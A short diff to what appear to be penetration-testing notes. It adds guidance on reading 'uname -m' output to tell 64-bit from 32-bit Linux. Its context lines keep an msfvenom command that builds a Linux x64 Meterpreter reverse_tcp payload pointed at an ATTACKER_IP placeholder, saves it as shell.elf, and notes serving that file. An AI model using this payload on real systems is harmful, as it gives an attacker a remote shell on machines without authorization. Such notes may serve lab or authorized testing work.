@@ -1,3 +1,7 @@
+## uname -m: This is the most universal method to check the kernel architecture.
+x86_64: 64-bit system.
+i386 or i686: 32-bit system.
+
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f elf -o shell.elf
 
 # Start the server in the same directory as shell.elf
